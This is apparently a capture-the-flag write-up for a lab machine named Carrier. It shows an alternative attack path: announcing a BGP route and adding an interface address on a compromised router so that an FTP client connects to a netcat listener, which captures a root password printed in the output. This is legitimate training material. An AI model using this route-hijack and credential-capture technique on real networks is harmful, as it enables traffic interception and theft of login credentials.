# Alternative way to exploit Carrier

## Getting SSH Password by adding an Interface

After getting access to the first router _(AS100)_, there is another way to gain access to the main box instead of the **BGP Hijack attack**.
By adding an IP to the interfaces of the router, the FTP connection will be sent directly to this device:

Creating the route as before:
```markdown
r1# configure terminal

r1(config)# router bgp 100

r1(config-router)# network 10.120.15.0/25

r1# clear ip bgp * out
```

Creating interface:
```markdown
ifconfig eth2 10.120.15.10 netmask 255.255.255.128
```

Waiting for FTP connection on port 21:
```markdown
nc -lvnp 21
```

After a minute the FTP connection will start and by sending the correct FTP codes, the password will be displayed:
```markdown
Connection from [10.78.10.2] port 21 [tcp/*] accepted (family 2, sport 47038)

USER root
331
PASS BGPtelc0rout1ng
331
ACCT put secretdata.txt
(...)
```
